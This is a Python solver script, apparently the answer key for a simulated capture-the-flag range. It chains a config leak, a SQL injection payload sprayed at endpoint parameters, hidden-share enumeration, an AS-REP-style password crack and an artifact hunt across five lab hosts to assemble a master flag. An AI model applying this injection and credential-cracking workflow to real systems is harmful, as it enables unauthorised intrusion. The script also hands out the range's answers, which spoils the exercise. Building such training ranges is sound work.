"""Intended-path solver: walk all five simulated hosts, assemble the master flag."""

import base64
import re
from typing import Any

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags

INJECT = "' UNION SELECT fragment,note FROM vault--"


def _xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def _rot7hex(text: str) -> str:
    return bytes((ord(c) + 7) % 256 for c in text).hex()


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    base = ctx.url()
    detail = None

    # host 1: web.dmz, reused-secret XOR leak
    home = httpx.get(base, headers={"Host": "web.dmz"}, timeout=10).text
    match = re.search(r'href="(/legacy/config\.b64)"', home) or re.search(
        r"(/[\w./-]*config\.b64)", home
    )
    frag_web = None
    db_creds: tuple[str, str] | None = None
    if not match and detail is None:
        detail = "web.dmz homepage leaked no config path"
    if match:
        raw = httpx.get(base + match.group(1), headers={"Host": "web.dmz"}, timeout=10).content
        plain = _xor(base64.b64decode(raw), b"web.dmz").decode(errors="replace")
        m_frag = re.search(r"fragment\[web\.dmz\]=([A-Z2-7]{4})", plain)
        m_user = re.search(r"user=(\S+)", plain)
        m_pass = re.search(r"pass=(\S+)", plain)
        if m_frag and m_user and m_pass:
            frag_web = m_frag.group(1)
            db_creds = (m_user.group(1), m_pass.group(1))
        elif detail is None:
            detail = f"decoded config lacked expected fields: {plain[:200]}"

    # host 2: db.internal, SQLi-lite bypass on the un-parameterized endpoint
    frag_db = None
    intel = ""
    if not db_creds and detail is None:
        detail = "no db.internal credentials recovered from web.dmz"
    else:
        auth = db_creds or ("", "")
        docs = httpx.get(
            base + "/docs", headers={"Host": "db.internal"}, auth=auth, timeout=10
        ).json()["endpoints"]
        for entry in docs:
            if frag_db:
                break
            for param in entry["params"]:
                reply: Any = httpx.get(
                    base + entry["path"],
                    headers={"Host": "db.internal"},
                    auth=auth,
                    params={param: INJECT},
                    timeout=10,
                )
                try:
                    rows = reply.json().get("rows", [])
                except Exception:
                    continue
                for row in rows:
                    if len(row) >= 2 and str(row[1]).startswith("intel:"):
                        frag_db = str(row[0])
                        intel = str(row[1])
                        break
        if not frag_db and detail is None:
            detail = "no documented endpoint yielded the vault row under injection"

    share = None
    asrep_user = None
    if intel:
        m_share = re.search(r"hides share (\S+)", intel)
        m_user = re.search(r"as-rep account is (\S+)", intel)
        share = m_share.group(1) if m_share else None
        asrep_user = m_user.group(1).rstrip(";,.") if m_user else None
    elif detail is None:
        detail = "vault note missing from injection results"

    # host 3: filesrv, hidden share
    frag_filesrv = None
    if not share and detail is None:
        detail = "hidden share name absent from intel"
    else:
        listing = httpx.get(
            base + f"/shares/{share}", headers={"Host": "filesrv"}, timeout=10
        ).json()
        for fname in listing.get("files", []):
            body_text = httpx.get(
                base + f"/shares/{share}/{fname}", headers={"Host": "filesrv"}, timeout=10
            ).text
            found = re.search(r"fragment\[filesrv\]=([A-Z2-7]{4})", body_text)
            if found:
                frag_filesrv = found.group(1)
                break
        if not frag_filesrv and detail is None:
            detail = f"no filesrv fragment inside {share}"

    # host 4: dc01, as-rep style crack with a served wordlist
    frag_dc = None
    users = httpx.get(base + "/kerberos/users", headers={"Host": "dc01"}, timeout=10).json()[
        "accounts"
    ]
    roastable = [u["name"] for u in users if u.get("preauth") is False]
    if not roastable and detail is None:
        detail = "dc01 lists no preauth-disabled account"
    target_user = (asrep_user if asrep_user in roastable else roastable[0]) if roastable else None
    if target_user:
        export = httpx.get(
            base + f"/kerberos/asrep/{target_user}", headers={"Host": "dc01"}, timeout=10
        ).json()
        candidates = httpx.get(
            base + "/wordlist.txt", headers={"Host": "dc01"}, timeout=10
        ).text.split()
        password = next((c for c in candidates if _rot7hex(c) == export["enc"]), None)
        if not password and detail is None:
            detail = "wordlist contained no candidate matching the as-rep export"
        if password:
            redeem = httpx.post(
                base + "/redeem",
                headers={"Host": "dc01"},
                json={"user": target_user, "password": password},
                timeout=10,
            ).json()
            frag_dc = redeem.get("fragment")
    elif detail is None:
        detail = "no as-rep target resolved"

    # host 5: workstation7, persistence artifact hunt
    frag_ws = None
    artifacts = httpx.get(base + "/artifacts", headers={"Host": "workstation7"}, timeout=10).json()[
        "artifacts"
    ]
    for artifact in artifacts:
        blob = httpx.get(
            base + f"/artifacts/{artifact['id']}",
            headers={"Host": "workstation7"},
            timeout=10,
        ).text
        found = re.search(r"fragment\[workstation7\]=([A-Z2-7]{4})", blob)
        if found:
            frag_ws = found.group(1)
            break
    if not frag_ws and detail is None:
        detail = "no workstation7 fragment across artifact actions"

    fragments = {
        "web.dmz": frag_web,
        "db.internal": frag_db,
        "filesrv": frag_filesrv,
        "dc01": frag_dc,
        "workstation7": frag_ws,
    }
    missing_hosts = sorted(h for h, v in fragments.items() if not v)

    captured = None
    if not missing_hosts:
        reply = httpx.post(base + "/scoreboard", json={"fragments": fragments}, timeout=10).json()
        flags = find_flags(reply.get("flag") or "")
        if reply.get("status") == "unlocked" and flags:
            captured = flags[0]
        elif detail is None:
            detail = f"scoreboard refused complete set: {reply}"
    elif detail is None:
        detail = f"fragments missing for {missing_hosts}"

    return SolveResult(
        results=[
            TaskResult(
                task_id="crown-master",
                ok=captured is not None,
                captured=captured,
                detail=detail,
            )
        ]
    )
